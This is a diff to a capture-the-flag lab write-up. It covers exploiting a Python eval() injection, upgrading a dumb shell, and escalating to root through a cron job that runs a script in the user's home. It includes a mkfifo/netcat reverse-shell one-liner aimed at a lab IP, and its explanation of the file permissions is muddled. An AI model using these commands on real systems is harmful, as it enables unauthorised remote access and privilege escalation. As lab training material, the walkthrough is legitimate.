@@ -48,7 +48,7 @@ nc 10.10.90.237 10000
  NameError: name 'a' is not defined
 
 ```
-I checked for python command injection and found out about the eval() exploit
+I checked for python command injection and found out about the eval() exploit,
 on my attack machine I set up the nc listener and run the netcat code in the victim machine
 
 ```
@@ -77,7 +77,14 @@ $ cat user.txt
 cf85ff769cfaaa721758949bf870b019
 $ 
 ```
+before anything else I have to upgrade the shell since this is a dumbshell
+```
 
+python -c 'import pty;pty.spawn("/bin/bash")'
+ctrl+z
+stty raw -echo;fg
+export TERM=xterm
+````
 # 2. Root txt
 Now I just need to escalate my priveleges
 ```
@@ -148,17 +155,7 @@ and is owned by king
 *  *    * * *   root    cd /root/company && bash run.sh
 
 ````
-before anything else I have to upgrade the shell since this is a dumbshell
-```
-
-python -c 'import pty;pty.spawn("/bin/bash")'
-ctrl+z
-stty raw -echo
-fg
-export TERM=xterm
-````
-Once I got the dumbshell I checked the crontab and it seems that root.sh is being run every minute I deleted the code inside the run.sh and inserted my own malicious netcat reverse shell code
-
+since the root.sh file is in our home folder, and we do not have read/write access to it, we have to delete it and make a new file named root.sh and enter this code below to intercept the root 
 ```
 
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.70.19 4445 >/tmp/f
